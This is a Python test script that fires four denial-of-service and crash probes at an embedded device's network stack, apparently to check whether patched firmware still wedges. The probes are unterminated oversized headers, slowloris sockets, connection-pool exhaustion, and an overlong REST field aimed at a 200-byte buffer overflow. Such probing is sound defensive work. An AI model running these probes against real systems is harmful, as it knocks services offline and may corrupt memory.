#!/usr/bin/env python3
"""Single-shot forcing probes for the documented network-stack wedge/crash vectors.

Each attack is run against a live device (ideally the PATCHED firmware, to show the
vector is independent of the NS-1 connection-churn fix). REST health is sampled
before, during (attack sockets held) and after release, so we can classify each
vector as: fixed / transient / persistent-wedge / crash.

Run ONE attack per invocation; recover the device with a Nios reset (JTAG redeploy)
between destructive runs.

  python3 netstack_force.py --host u64 --attack h2   # oversized-header busy-spin
  python3 netstack_force.py --host u64 --attack h5   # slowloris slot exhaustion
  python3 netstack_force.py --host u64 --attack n2   # idle netconn-pool exhaustion
  python3 netstack_force.py --host u64 --attack r1   # oversized REST error -> stack smash
"""
from __future__ import annotations

import argparse
import http.client
import socket
import sys
import time


def health(host: str, port: int, timeout: float = 4.0) -> str:
    try:
        c = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            c.request("GET", "/v1/version", headers={"Connection": "close"})
            r = c.getresponse()
            b = r.read()
            return f"OK status={r.status} bytes={len(b)}"
        finally:
            c.close()
    except Exception as e:  # noqa: BLE001
        return f"FAIL {type(e).__name__}:{e}"


def health_series(host: str, port: int, label: str, n: int = 5, gap: float = 1.5) -> None:
    for i in range(n):
        print(f"  [{label} +{i}] health = {health(host, port)}", flush=True)
        if i < n - 1:
            time.sleep(gap)


def attack_h2(host: str, port: int) -> None:
    """Oversized header (>2048 B) with no terminator, socket held open + still sending."""
    s = socket.create_connection((host, port), timeout=4)
    s.sendall(b"GET / HTTP/1.1\r\n")
    line = b"X-Pad: " + b"a" * 64 + b"\r\n"
    sent = 0
    try:
        for _ in range(200):  # ~14 KB of header lines, no blank line
            s.sendall(line)
            sent += len(line)
        print(f"  sent {sent} bytes of unterminated headers, holding socket open", flush=True)
    except OSError as e:
        print(f"  send stopped: {e} (after {sent} bytes)", flush=True)
    print("  health WHILE attack socket held:", flush=True)
    health_series(host, port, "during", n=3)
    try:
        s.close()
    except OSError:
        pass


def attack_h5(host: str, port: int) -> None:
    """Slowloris: open several sockets, send a partial request, then nothing."""
    socks = []
    for i in range(8):
        try:
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n")  # no final blank line
            socks.append(s)
        except OSError as e:
            print(f"  slot {i}: connect/send failed: {e}", flush=True)
    print(f"  opened {len(socks)} half-open connections, holding", flush=True)
    print("  health WHILE slots held:", flush=True)
    health_series(host, port, "during", n=3)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass


def attack_n2(host: str, http_port: int, ftp_port: int, telnet_port: int) -> None:
    """Hold many idle TCP connections across services to drain the netconn pool."""
    socks = []
    targets = [ftp_port, telnet_port, http_port] * 8  # 24 idle connections
    for i, p in enumerate(targets):
        try:
            s = socket.create_connection((host, p), timeout=4)
            socks.append((p, s))
        except OSError as e:
            print(f"  conn {i} port {p}: {e}", flush=True)
    print(f"  opened {len(socks)} idle connections across ftp/telnet/http", flush=True)
    print("  health (REST) WHILE connections held:", flush=True)
    health_series(host, http_port, "during", n=3)
    for _p, s in socks:
        try:
            s.close()
        except OSError:
            pass


def attack_r1(host: str, port: int) -> None:
    """Oversized REST error string -> vsprintf into char msg[200] on the HTTP task."""
    long_name = "A" * 400
    # Path 1: unknown query param on a valid endpoint.
    try:
        c = http.client.HTTPConnection(host, port, timeout=4)
        c.request("GET", f"/v1/version?{long_name}=1", headers={"Connection": "close"})
        r = c.getresponse()
        r.read()
        print(f"  GET long-query returned status={r.status}", flush=True)
        c.close()
    except Exception as e:  # noqa: BLE001
        print(f"  GET long-query raised {type(e).__name__}:{e}", flush=True)
    # Path 2: POST /v1/configs with an oversized invalid category key.
    try:
        body = ('{"' + long_name + '":{}}').encode()
        c = http.client.HTTPConnection(host, port, timeout=4)
        c.request("POST", "/v1/configs", body=body,
                  headers={"Connection": "close", "Content-Type": "application/json"})
        r = c.getresponse()
        r.read()
        print(f"  POST long-key returned status={r.status}", flush=True)
        c.close()
    except Exception as e:  # noqa: BLE001
        print(f"  POST long-key raised {type(e).__name__}:{e}", flush=True)


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--host", default="u64")
    ap.add_argument("--http-port", type=int, default=80)
    ap.add_argument("--ftp-port", type=int, default=21)
    ap.add_argument("--telnet-port", type=int, default=23)
    ap.add_argument("--attack", required=True, choices=("h2", "h5", "n2", "r1"))
    args = ap.parse_args(argv)

    print(f"=== attack {args.attack} on {args.host} ===", flush=True)
    print(f"  health BEFORE = {health(args.host, args.http_port)}", flush=True)
    if args.attack == "h2":
        attack_h2(args.host, args.http_port)
    elif args.attack == "h5":
        attack_h5(args.host, args.http_port)
    elif args.attack == "n2":
        attack_n2(args.host, args.http_port, args.ftp_port, args.telnet_port)
    elif args.attack == "r1":
        attack_r1(args.host, args.http_port)
    print("  health AFTER release (recovery test):", flush=True)
    health_series(args.host, args.http_port, "after", n=6, gap=1.5)
    final = health(args.host, args.http_port)
    print(f"  FINAL health = {final}", flush=True)
    print(f"  VERDICT: {'REST-ALIVE' if final.startswith('OK') else 'REST-WEDGED/DOWN'}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
